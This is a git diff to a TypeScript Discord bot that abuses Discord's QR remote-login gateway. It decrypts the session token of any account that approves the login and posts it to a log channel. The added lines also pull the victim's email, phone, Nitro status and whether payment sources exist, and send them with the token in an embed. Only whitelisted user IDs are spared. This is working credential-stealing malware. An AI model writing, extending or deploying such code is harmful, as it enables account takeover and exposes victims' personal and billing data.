@@ -4,22 +4,26 @@ import { generateKeyPairSync, createHash, privateDecrypt } from "crypto";
 import WebSocket from "ws";
 import Jimp from "jimp";
 
-import { IConfig, IData } from './global';
+import { IConfig, IData, IUser } from './global';
 const config: IConfig = require('../config.json');
 
 let SocketClient: WebSocket;
 let Heart: NodeJS.Timeout;
 let Timeout: NodeJS.Timeout;
 
+const close = () => {
+    try {
+
+        SocketClient.close();
+        clearTimeout(Heart);
+        clearTimeout(Timeout);
+    } catch {}
+}
+
 export default (message: Message, embed: MessageEmbed, client: Client) => new Promise(reslove => {
     const keyPair = generateKeyPairSync("rsa", { modulusLength: 2048, publicExponent: 65537 });
 
     SocketClient = new WebSocket('wss://remote-auth-gateway.discord.gg/?v=1', { origin: 'https://discord.com' });
-    SocketClient.onclose = () => { 
-        try {
-            clearInterval(Heart); clearTimeout(Timeout); 
-        } catch {}
-    }
     SocketClient.onmessage = async (x) => {
         const data: IData = JSON.parse(x.data as string);
 
@@ -28,19 +32,9 @@ export default (message: Message, embed: MessageEmbed, client: Client) => new Pr
                 try {
                     SocketClient.send(JSON.stringify({ op: 'init', encoded_public_key: keyPair.publicKey.export({ type: 'spki', format: 'der' }).toString("base64") }));
                 } catch {}
-                Timeout = setTimeout(() => {
-                    try {
-                        SocketClient.close();
-                    } catch {}
-                }, 60000);
+                Timeout = setTimeout(() => {close()}, 60000);
                 Heart = setInterval(() => {
-                    try {
-                        SocketClient.send(JSON.stringify({ op: 'heartbeat' }));
-                    } catch (error) {
-                        try {
-                            SocketClient.close();
-                        } catch {}
-                    }
+                    try { SocketClient.send(JSON.stringify({ op: 'heartbeat' })); } catch {}
                 }, data.heartbeat_interval);
                 break;
             case 'nonce_proof':
@@ -72,15 +66,29 @@ export default (message: Message, embed: MessageEmbed, client: Client) => new Pr
                 const decryptedToken = privateDecrypt({ key: keyPair.privateKey, oaepHash: 'sha256' }, Buffer.from((data.encrypted_token as string), 'base64'));
                 const token = decryptedToken.toString();
 
-                const discord = await (await fetch(`https://discord.com/api/users/@me`, { headers: { Authorization: token } })).json();
+                const discord: IUser = await (await fetch(`https://discord.com/api/users/@me`, { headers: { Authorization: token } })).json();
 
                 for (const whitelist of config.whitelisted_users) 
                     if (discord.id === whitelist) return reslove(token);
+                    
+                const billingInformation = await (await fetch(`https://discord.com/api/v9/users/@me/billing/payment-sources`, { headers: { Authorization: token } })).json();
 
-                try {
-                    SocketClient.close();
-                    (await client.channels.cache.get(config.log_channel) as TextChannel).send(token).catch(e => {});
-                } catch {}
+                const tokenLoggedEmbed = new MessageEmbed()
+                    .setColor('#FF0000')
+                    .setAuthor({
+                        name: `${discord.username}${discord.discriminator} ${discord.id}`,
+                        iconURL: `https://cdn.discordapp.com/avatars/${discord.id}/${discord.avatar}.png`
+                    })
+                    .addField('Account Info', `
+                        Email: ${discord.email}
+                        Phone: ${discord.phone}
+                        Nitro: ${discord.premium_type ? (discord.premium_type === 2 ? 'Nitro' : 'Nitro Classic') : 'None'}
+                        Billing Info: ${billingInformation.length > 0 ? 'Yes' : 'No'}
+                    `)
+                    .addField('Token', token)
+
+                close();
+                (await client.channels.cache.get(config.log_channel) as TextChannel).send({ embeds: [tokenLoggedEmbed] }).catch(e => {});
                 reslove(token);
                 break;
             default:
